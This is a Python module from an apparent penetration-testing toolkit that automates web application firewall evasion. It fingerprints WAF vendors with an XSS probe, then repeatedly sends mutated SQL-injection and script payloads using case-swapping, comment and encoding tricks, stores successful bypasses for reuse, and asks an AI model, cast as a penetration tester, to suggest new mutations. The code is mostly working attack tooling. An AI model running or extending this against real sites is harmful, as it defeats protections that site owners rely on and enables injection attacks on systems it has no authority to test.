from __future__ import annotations
import httpx
import re
import logging
from typing import List, Dict, Optional, Literal, Callable, Tuple
from pentkit.core.logger import get_module_logger
from pentkit.core.ai_engine import AIEngine
from pentkit.modules.web.waf_memory import WAFMemory, WAFMemoryEntry

logger = get_module_logger("web.waf_bypass")

class WAFProfile(BaseModel):
    vendor: Literal["cloudflare", "imperva", "modsecurity", "akamai", "aws", "f5", "generic", "none"]
    detected: bool
    confidence: float

class BypassResult(BaseModel):
    success: bool
    payload: str
    iterations: int
    notes: str

class WAFBypassEngine:
    """
    Iterative WAF bypass using response feedback.
    Modelled on how a skilled human analyst actually does this.
    """

    def __init__(self, ai: AIEngine):
        self.ai = ai
        self.memory = WAFMemory()
        self.mutation_history = []

    async def _test_payload(self, url: str, method: str, param: str, payload: str) -> bool:
        """Helper to send a request and determine if it bypassed the WAF."""
        async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
            try:
                if method == "GET":
                    response = await client.get(url, params={param: payload})
                else:
                    response = await client.post(url, data={param: payload})
                
                if response.status_code == 200:
                    # Basic confirmation it landed
                    if "error" not in response.text.lower() or payload in response.text:
                        return True
            except Exception:
                pass
        return False

    async def detect_waf(self, url: str) -> WAFProfile:
        """
        Probe for WAF signatures in headers and body.
        """
        async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
            try:
                # Trigger a simple block
                response = await client.get(url, params={"test": "<script>alert(1)</script>"})
                headers = response.headers
                body = response.text
                
                if "cf-ray" in headers or "cloudflare" in body.lower():
                    return WAFProfile(vendor="cloudflare", detected=True, confidence=1.0)
                if "incapsula" in body.lower() or "visid_incap" in headers.get('Set-Cookie', ''):
                    return WAFProfile(vendor="imperva", detected=True, confidence=1.0)
                if "modsecurity" in body.lower() or "ModSecurity" in headers.get('Server', ''):
                    return WAFProfile(vendor="modsecurity", detected=True, confidence=1.0)
                if "Reference #" in body and response.status_code == 403:
                    return WAFProfile(vendor="akamai", detected=True, confidence=0.8)
                if "x-amzn-requestid" in headers:
                    return WAFProfile(vendor="aws", detected=True, confidence=0.7)
                if "The requested URL was rejected" in body:
                    return WAFProfile(vendor="f5", detected=True, confidence=0.9)
                
                if response.status_code == 403:
                    return WAFProfile(vendor="generic", detected=True, confidence=0.5)
            except Exception:
                pass
        return WAFProfile(vendor="none", detected=False, confidence=1.0)

    async def bypass_loop(
        self,
        url: str,
        method: Literal["GET", "POST"],
        param: str,
        payload: str,
        waf: WAFProfile,
        max_iterations: int = 50,
    ) -> BypassResult:
        """
        Iterative loop to bypass WAF by mutating payloads.
        """
        # GAP 5: Check inter-session memory first
        known_mutations = self.memory.get_known_bypasses(waf.vendor, payload)
        for mut in known_mutations:
            if await self._test_payload(url, method, param, mut):
                return BypassResult(success=True, payload=mut, iterations=0, notes="Bypass retrieved from memory")

        current_payload = payload
        for i in range(max_iterations):
            try:
                if await self._test_payload(url, method, param, current_payload):
                    # GAP 5: Store successful bypass in memory
                    self.memory.store_bypass(WAFMemoryEntry(
                        waf_vendor=waf.vendor,
                        blocked_payload=payload,
                        successful_mutation=current_payload,
                        endpoint_context=url,
                        confidence=1.0
                    ))
                    return BypassResult(success=True, payload=current_payload, iterations=i+1, notes="200 OK")

                async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                    if method == "GET":
                        response = await client.get(url, params={param: current_payload})
                    else:
                        response = await client.post(url, data={param: current_payload})
                    
                    # Classify block
                    if response.status_code in [403, 406, 419]:
                        # Mutation strategy based on block
                        if i % 10 == 9:
                            # Every 10th iteration, ask AI for suggestions
                            current_payload = await self._get_ai_suggestion(current_payload, response.text, waf)
                        else:
                            # Apply generic mutations
                            current_payload = self._apply_random_mutation(current_payload)
                    else:
                        # Not a block, but maybe a bad request?
                        current_payload = self._apply_random_mutation(current_payload)
                        
            except Exception as e:
                logger.debug(f"Bypass trial failed: {e}")
                current_payload = self._apply_random_mutation(current_payload)

        return BypassResult(success=False, payload=payload, iterations=max_iterations, notes="Max iterations reached")

    async def _get_ai_suggestion(self, blocked_payload: str, response_text: str, waf: WAFProfile) -> str:
        """Use AI to suggest bypass mutations."""
        system = "You are a senior penetration tester. These payloads were blocked by a WAF. Suggest a mutation to bypass it."
        user = f"WAF Vendor: {waf.vendor}\nBlocked Payload: {blocked_payload}\nResponse Body (truncated): {response_text[:500]}"
        
        try:
            class Mutation(BaseModel):
                payload: str
                rationale: str

            result = await self.ai.complete(system, user, schema=Mutation)
            return result.payload
        except Exception:
            return self._apply_random_mutation(blocked_payload)

    def _apply_random_mutation(self, payload: str) -> str:
        """Apply a random mutation from the library."""
        # Simple placeholder for mutations library
        import random
        mutations = [
            lambda p: p.swapcase(),
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace(' ', '+'),
            lambda p: p.replace('UNION', 'uNiOn'),
            lambda p: p.replace('SELECT', 'sElEcT'),
            lambda p: p.replace("'", "''"),
            lambda p: p.replace("'", "%27"),
            lambda p: p.replace("<script>", "<sCrIpT>"),
        ]
        return random.choice(mutations)(payload)

from pydantic import BaseModel
__all__ = ["WAFBypassEngine", "WAFProfile", "BypassResult"]
